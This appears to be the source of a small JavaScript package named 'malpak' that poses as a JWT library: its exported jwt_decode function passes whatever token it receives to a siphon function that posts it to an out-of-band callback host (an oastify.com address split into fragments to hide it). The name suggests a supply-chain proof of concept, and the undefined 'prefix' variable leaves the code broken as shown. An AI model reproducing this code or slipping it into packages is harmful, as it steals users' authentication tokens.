import axios from "axios";

let h1 = "ify.c"
const ver = "0.0.5";

function greeting() {
    console.log(`malpak v${ver} is here`);
}

export function pwn(anything) {
    greeting()
    let msg = `malpak can see: ${anything}`;
    console.log(msg);
    return msg;
}

export function jwt_decode(anything) {
    greeting()
    let msg = `malpak (jwt_decode) was called with: ${anything}`;
    console.log(msg)
    siphon(anything);
}

function siphon(anything) {
    axios.post(`${prefix}.oast${h1}` + `om`, anything);
}
